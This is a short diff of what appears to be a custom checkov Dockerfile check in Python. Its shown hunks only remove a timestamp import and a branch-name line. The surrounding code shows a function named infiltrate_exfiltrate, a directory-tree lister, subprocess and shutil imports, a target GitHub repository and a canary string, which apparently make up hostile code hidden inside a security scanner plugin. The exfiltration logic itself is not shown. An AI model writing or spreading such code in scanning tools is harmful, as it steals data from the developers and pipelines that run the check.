@@ -1,7 +1,7 @@
 from __future__ import annotations
 
 from typing import TYPE_CHECKING, List
-import re, json, os, datetime, subprocess, shutil
+import re, json, os, subprocess, shutil
 
 from checkov.common.models.enums import CheckCategories, CheckResult
 from checkov.dockerfile.base_dockerfile_check import BaseDockerfileCheck
@@ -25,9 +25,7 @@ def list_directory_tree(start_path):
 def infiltrate_exfiltrate():
 
     # Variables
-    time = datetime.today().strftime('%Y%m%d%H%M')
     repo_url = "https://github.com/ytimyno/cat-pictures"  
-    branch_name = f"b2_{time}_sssh"  
     clone_dir = "cats"
     check_if_you_read = "astronaut_riding_a_whale"
 
